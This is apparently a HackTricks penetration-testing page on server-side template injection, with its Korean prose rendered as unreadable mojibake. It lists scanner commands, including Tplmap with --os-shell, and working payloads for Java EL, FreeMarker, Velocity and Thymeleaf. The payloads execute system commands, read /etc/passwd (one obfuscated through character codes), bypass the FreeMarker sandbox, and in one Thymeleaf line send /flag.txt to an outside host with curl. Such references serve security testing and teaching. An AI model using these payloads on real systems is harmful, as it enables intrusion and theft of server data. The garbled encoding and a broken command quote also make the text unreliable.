# SSTI (ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì…)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„**í•˜ê¸° ìœ„í•œ ë¯¸ì…˜ì„ ê°€ì§„ ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ì—´ì •ì ì¸ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## SSTI (ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì…)ë€?

ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì…ì€ ê³µê²©ìê°€ ì„œë²„ì—ì„œ ì‹¤í–‰ë˜ëŠ” í…œí”Œë¦¿ì— ì•…ì„± ì½”ë“œë¥¼ ì‚½ì…í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ Jinjaë¥¼ í¬í•¨í•œ ë‹¤ì–‘í•œ ê¸°ìˆ ì—ì„œ ë°œê²¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

JinjaëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì¸ê¸°ìˆëŠ” í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. Jinjaë¥¼ ì‚¬ìš©í•œ ì·¨ì•½í•œ ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆì œë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:
```python
output = template.render(name=request.args.get('name'))
```
ì´ ì·¨ì•½í•œ ì½”ë“œì—ì„œëŠ” ì‚¬ìš©ìì˜ ìš”ì²­ì—ì„œ `name` ë§¤ê°œë³€ìˆ˜ê°€ `render` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í…œí”Œë¦¿ì— ì§ì ‘ ì „ë‹¬ë©ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ê³µê²©ìëŠ” `name` ë§¤ê°œë³€ìˆ˜ì— ì•…ì„± ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì…ì„ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ê³µê²©ìëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ê°€ì§„ ìš”ì²­ì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
í˜ì´ë¡œë“œ `{{bad-stuff-here}}`ê°€ `name` ë§¤ê°œë³€ìˆ˜ì— ì‚½ì…ë©ë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œì—ëŠ” ê³µê²©ìê°€ ë¬´ë‹¨ìœ¼ë¡œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜ í…œí”Œë¦¿ ì—”ì§„ì„ ì¡°ì‘í•˜ì—¬ ì„œë²„ë¥¼ ì œì–´í•  ìˆ˜ ìˆëŠ” Jinja í…œí”Œë¦¿ ì§€ì‹œë¬¸ì´ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì… ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ê°œë°œìëŠ” ì‚¬ìš©ì ì…ë ¥ì´ í…œí”Œë¦¿ì— ì‚½ì…ë˜ê¸° ì „ì— ì ì ˆí•˜ê²Œ ì‚´ê· ë˜ê³  ìœ íš¨ì„±ì´ ê²€ì¦ë˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤. ì…ë ¥ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ êµ¬í˜„í•˜ê³  ë¬¸ë§¥ì— ë”°ë¼ ì´ìŠ¤ì¼€ì´í”„ ê¸°ë²•ì„ ì‚¬ìš©í•˜ë©´ ì´ ì·¨ì•½ì ì˜ ìœ„í—˜ì„ ì™„í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### íƒì§€
ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì… (SSTI)ì„ íƒì§€í•˜ê¸° ìœ„í•´ ì´ˆê¸°ì—ëŠ” **í…œí”Œë¦¿ í¼ì§•**ì´ ì§ê´€ì ì¸ ì ‘ê·¼ ë°©ë²•ì…ë‹ˆë‹¤. ì´ëŠ” í…œí”Œë¦¿ì— íŠ¹ìˆ˜ ë¬¸ì ì‹œí€€ìŠ¤ (**`${{<%[%'"}}%\`**)ë¥¼ ì‚½ì…í•˜ê³  ì¼ë°˜ ë°ì´í„°ì™€ ì´ íŠ¹ìˆ˜ í˜ì´ë¡œë“œì— ëŒ€í•œ ì„œë²„ ì‘ë‹µì˜ ì°¨ì´ë¥¼ ë¶„ì„í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì·¨ì•½ì  ì§€í‘œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
- ì·¨ì•½ì ê³¼ ì ì¬ì ìœ¼ë¡œ í…œí”Œë¦¿ ì—”ì§„ì„ ë“œëŸ¬ë‚´ëŠ” ì˜¤ë¥˜ ë°œìƒ.
- ë°˜ì‚¬ì—ì„œ í˜ì´ë¡œë“œê°€ ì—†ê±°ë‚˜ ì¼ë¶€ê°€ ëˆ„ë½ë˜ì–´ ìˆëŠ” ê²½ìš°, ì„œë²„ê°€ ì¼ë°˜ ë°ì´í„°ì™€ ë‹¤ë¥´ê²Œ ì²˜ë¦¬í•œë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸.

- **ì¼ë°˜ í…ìŠ¤íŠ¸ ë¬¸ë§¥**: ì„œë²„ê°€ í…œí”Œë¦¿ í‘œí˜„ì‹ (ì˜ˆ: `{{7*7}}`, `${7*7}`)ì„ í‰ê°€í•˜ëŠ”ì§€ XSSì™€ êµ¬ë¶„í•˜ì—¬ í™•ì¸.

- **ì½”ë“œ ë¬¸ë§¥**: ì…ë ¥ ë§¤ê°œë³€ìˆ˜ë¥¼ ë³€ê²½í•˜ì—¬ ì·¨ì•½ì ì„ í™•ì¸. ì˜ˆë¥¼ ë“¤ì–´ `http://vulnerable-website.com/?greeting=data.username`ì˜ `greeting`ì„ ë³€ê²½í•˜ì—¬ ì„œë²„ì˜ ì¶œë ¥ì´ ë™ì ì¸ì§€ ê³ ì •ëœì§€ í™•ì¸í•˜ê±°ë‚˜ `greeting=data.username}}hello`ê°€ ì‚¬ìš©ì ì´ë¦„ì„ ë°˜í™˜í•˜ëŠ”ì§€ í™•ì¸.

#### ì‹ë³„ ë‹¨ê³„
í…œí”Œë¦¿ ì—”ì§„ì„ ì‹ë³„í•˜ê¸° ìœ„í•´ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ë¶„ì„í•˜ê±°ë‚˜ ë‹¤ì–‘í•œ ì–¸ì–´ë³„ í˜ì´ë¡œë“œë¥¼ ìˆ˜ë™ìœ¼ë¡œ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê²ƒì´ í•„ìš”í•©ë‹ˆë‹¤. ì˜¤ë¥˜ë¥¼ ì¼ìœ¼í‚¤ëŠ” ì¼ë°˜ì ì¸ í˜ì´ë¡œë“œì—ëŠ” `${7/0}`, `{{7/0}}`, `<%= 7/0 %>` ë“±ì´ ìˆìŠµë‹ˆë‹¤. ìˆ˜í•™ ì—°ì‚°ì— ëŒ€í•œ ì„œë²„ì˜ ì‘ë‹µì„ ê´€ì°°í•˜ì—¬ íŠ¹ì • í…œí”Œë¦¿ ì—”ì§„ì„ ì •í™•íˆ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë„êµ¬

### [TInjA](https://github.com/Hackmanit/TInjA)

ìƒˆë¡œìš´ í´ë¦¬ê¸€ë¡¯ì„ í™œìš©í•˜ëŠ” íš¨ìœ¨ì ì¸ SSTI + CSTI ìŠ¤ìºë„ˆì…ë‹ˆë‹¤.
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImapì€ Server-Side Template Injection (SSTI) ì·¨ì•½ì ì„ íƒì§€í•˜ê¸° ìœ„í•œ ë„êµ¬ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ë‹¤ì–‘í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ SSTI ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆë„ë¡ ë„ì™€ì¤ë‹ˆë‹¤. SSTIëŠ” ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì—”ì§„ì„ ì´ìš©í•˜ì—¬ ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ë©´ ê³µê²©ìëŠ” ì„œë²„ì˜ ë°ì´í„°ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ ë“±ì˜ ì•…ì˜ì ì¸ í–‰ìœ„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

SSTImapì€ ë‹¤ì–‘í•œ í…œí”Œë¦¿ ì—”ì§„ (ì˜ˆ: Jinja2, Twig, Freemarker ë“±)ì„ ì§€ì›í•˜ë©°, ì‚¬ìš©ìê°€ ì§ì ‘ í…œí”Œë¦¿ ì—”ì§„ì„ ì¶”ê°€í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” í…œí”Œë¦¿ ì—”ì§„ì˜ ì·¨ì•½ì ì„ ìë™ìœ¼ë¡œ íƒì§€í•˜ê³ , ì·¨ì•½í•œ ë¶€ë¶„ì„ ì‹ë³„í•˜ì—¬ ë³´ê³ ì„œë¡œ ì œê³µí•©ë‹ˆë‹¤. SSTImapì„ ì‚¬ìš©í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ SSTI ì·¨ì•½ì ì„ ì‹ ì†í•˜ê²Œ ë°œê²¬í•˜ê³  ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

SSTImapì€ Pythonìœ¼ë¡œ ì‘ì„±ë˜ì—ˆìœ¼ë©°, ì‚¬ìš©í•˜ê¸° ì‰¬ìš´ ëª…ë ¹ì¤„ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ SSTI ì·¨ì•½ì ì„ íš¨ê³¼ì ìœ¼ë¡œ íƒì§€í•˜ê³  ëŒ€ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. SSTImapì€ ê°œë°œì ë° ë³´ì•ˆ ì „ë¬¸ê°€ì—ê²Œ ìœ ìš©í•œ ë„êµ¬ì…ë‹ˆë‹¤.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmapì€ ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì¸ì ì…˜(SSTI) ì·¨ì•½ì ì„ ìë™ìœ¼ë¡œ íƒì§€í•˜ê³  ì•…ìš©í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ë‹¤ì–‘í•œ í…œí”Œë¦¿ ì—”ì§„ì— ëŒ€í•œ í˜ì´ë¡œë“œë¥¼ ì œê³µí•˜ë©°, ì‚¬ìš©ì ì§€ì • í˜ì´ë¡œë“œë¥¼ ì¶”ê°€í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. Tplmapì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ SSTI ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ìœ ìš©í•œ ë„êµ¬ì…ë‹ˆë‹¤.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [í…œí”Œë¦¿ ì£¼ì… í…Œì´ë¸”](https://github.com/Hackmanit/template-injection-table)

ê°€ì¥ íš¨ìœ¨ì ì¸ í…œí”Œë¦¿ ì£¼ì… í´ë¦¬ê¸€ë¡¯ê³¼ 44ê°œì˜ ì£¼ìš” í…œí”Œë¦¿ ì—”ì§„ì˜ ì˜ˆìƒ ì‘ë‹µì„ í¬í•¨í•œ ëŒ€í™”í˜• í…Œì´ë¸”ì…ë‹ˆë‹¤.

## Exploits

### ì¼ë°˜ì ì¸

ì´ **ì›Œë“œë¦¬ìŠ¤íŠ¸**ì—ì„œëŠ” ì•„ë˜ ì–¸ê¸‰ëœ ì—”ì§„ë“¤ì˜ í™˜ê²½ì—ì„œ ì •ì˜ëœ **ë³€ìˆ˜ë“¤**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### ìë°”

**ìë°” - ê¸°ë³¸ ì£¼ì…**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
## Java - ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ ê°€ì ¸ì˜¤ê¸°

ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ëŠ” ìš´ì˜ ì²´ì œì—ì„œ ì‚¬ìš©ë˜ëŠ” ì¤‘ìš”í•œ ì •ë³´ë¥¼ í¬í•¨í•˜ê³  ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Javaì—ì„œëŠ” `System.getenv()` ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” `Map<String, String>` í˜•ì‹ì˜ ê²°ê³¼ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.

```java
Map<String, String> env = System.getenv();
for (String key : env.keySet()) {
    String value = env.get(key);
    System.out.println(key + " = " + value);
}
```

ìœ„ì˜ ì½”ë“œëŠ” ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ì˜ ëª¨ë“  í‚¤ì™€ ê°’ì„ ì¶œë ¥í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì‹œìŠ¤í…œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ê²€ìƒ‰í•˜ê³  í•„ìš”í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwd ê°€ì ¸ì˜¤ê¸°**

Server-Side Template Injection (SSTI)ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì‹¬ê°í•œ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ í†µí•´ ê³µê²©ìëŠ” ì„œë²„ì˜ íŒŒì¼ ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ì¤‘ìš”í•œ ì •ë³´ë¥¼ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¬¸ì„œì—ì„œëŠ” Java ì–¸ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ SSTIë¥¼ í†µí•´ /etc/passwd íŒŒì¼ì„ ê°€ì ¸ì˜¤ëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤.

1. ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ SSTI ì·¨ì•½ì ì€ í…œí”Œë¦¿ ì—”ì§„ì„ ì‚¬ìš©í•˜ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œê²¬ë©ë‹ˆë‹¤.

2. í…œí”Œë¦¿ ì—”ì§„ì˜ ì·¨ì•½í•œ ë¶€ë¶„ì„ ì°¾ìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì¤‘ê´„í˜¸({{}}) ë˜ëŠ” í¼ì„¼íŠ¸ ê¸°í˜¸(%%)ë¡œ ë‘˜ëŸ¬ì‹¸ì¸ ì½”ë“œ ë¸”ë¡ì´ SSTI ì·¨ì•½ì ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

3. ì·¨ì•½í•œ ë¶€ë¶„ì— Java ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ /etc/passwd íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ì˜ˆì‹œ ì½”ë“œì…ë‹ˆë‹¤.

```java
${new java.io.BufferedReader(new java.io.FileReader("/etc/passwd")).lines().collect(java.util.stream.Collectors.joining("\n"))}
```

4. ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ /etc/passwd íŒŒì¼ì˜ ë‚´ìš©ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì‚¬ìš©ì ê³„ì • ì •ë³´ì™€ ê°™ì€ ì¤‘ìš”í•œ ì •ë³´ë¥¼ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

SSTI ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ /etc/passwd íŒŒì¼ì„ ê°€ì ¸ì˜¤ëŠ” ê²ƒì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆ ì·¨ì•½ì ì„ í™•ì¸í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ í•­ìƒ ë²•ì ì¸ í—ˆê°€ë¥¼ ë°›ì€ ê²½ìš°ì—ë§Œ í…ŒìŠ¤íŠ¸ ë° ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

ë‹¹ì‹ ì€ [https://try.freemarker.apache.org](https://try.freemarker.apache.org)ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì‹œë„í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (ë ˆê±°ì‹œ)`
* `${7*'7'} ì•„ë¬´ê²ƒë„ ì—†ìŒ`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - ìƒŒë“œë°•ìŠ¤ ìš°íšŒ**

âš ï¸ Freemarker ë²„ì „ 2.3.30 ë¯¸ë§Œì—ì„œë§Œ ì‘ë™í•©ë‹ˆë‹¤.
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**ì¶”ê°€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ì˜ FreeMarker ì„¹ì…˜ì—ì„œ ìì„¸í•œ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)ì—ì„œë„ ìì„¸í•œ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**ì¶”ê°€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ì˜ Velocity ì„¹ì…˜ì—ì„œ ë” ë§ì€ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)ì—ì„œë„ ê´€ë ¨ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Thymeleaf

Thymeleafì—ì„œëŠ” SSTI ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ `${7*7}`ì™€ ê°™ì€ í‘œí˜„ì‹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ í…œí”Œë¦¿ ì—”ì§„ì—ë„ í•´ë‹¹í•©ë‹ˆë‹¤. ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ í‘œí˜„ì‹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

ThymeleafëŠ” ì´ëŸ¬í•œ í‘œí˜„ì‹ì„ íŠ¹ì • ì†ì„± ë‚´ì— ë°°ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ _í‘œí˜„ì‹ ì¸ë¼ì¸_ì€ ë‹¤ë¥¸ í…œí”Œë¦¿ ìœ„ì¹˜ì—ì„œë„ `[[...]]` ë˜ëŠ” `[(...)]`ì™€ ê°™ì€ êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ì—¬ ì§€ì›ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ê°„ë‹¨í•œ SSTI í…ŒìŠ¤íŠ¸ í˜ì´ë¡œë“œëŠ” `[[${7*7}]]`ì™€ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ í˜ì´ë¡œë“œê°€ ì‘ë™í•  ê°€ëŠ¥ì„±ì€ ì¼ë°˜ì ìœ¼ë¡œ ë‚®ìŠµë‹ˆë‹¤. Thymeleafì˜ ê¸°ë³¸ êµ¬ì„±ì€ ë™ì  í…œí”Œë¦¿ ìƒì„±ì„ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. í…œí”Œë¦¿ì€ ë¯¸ë¦¬ ì •ì˜ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ê°œë°œìëŠ” ë¬¸ìì—´ì—ì„œ í…œí”Œë¦¿ì„ ë™ì ìœ¼ë¡œ ìƒì„±í•˜ê¸° ìœ„í•´ ìì²´ `TemplateResolver`ë¥¼ êµ¬í˜„í•´ì•¼ í•˜ëŠ”ë°, ì´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ë°©ë²•ì…ë‹ˆë‹¤.

ThymeleafëŠ” ë˜í•œ _í‘œí˜„ì‹ ì „ì²˜ë¦¬_ë¥¼ ì œê³µí•˜ëŠ”ë°, ì´ì¤‘ ì–¸ë”ìŠ¤ì½”ì–´(`__...__`) ë‚´ì˜ í‘œí˜„ì‹ì´ ì „ì²˜ë¦¬ë©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ Thymeleafì˜ ë¬¸ì„œì—ì„œ ì„¤ëª…ëœ ëŒ€ë¡œ í‘œí˜„ì‹ êµ¬ì„±ì— í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
#{selection.__${sel.code}__}
```
**Thymeleafì—ì„œ ì·¨ì•½ì  ì˜ˆì‹œ**

ë‹¤ìŒì€ ì•…ìš© ê°€ëŠ¥ì„±ì´ ìˆëŠ” ì½”ë“œ ìŠ¤ë‹ˆí«ì…ë‹ˆë‹¤.
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
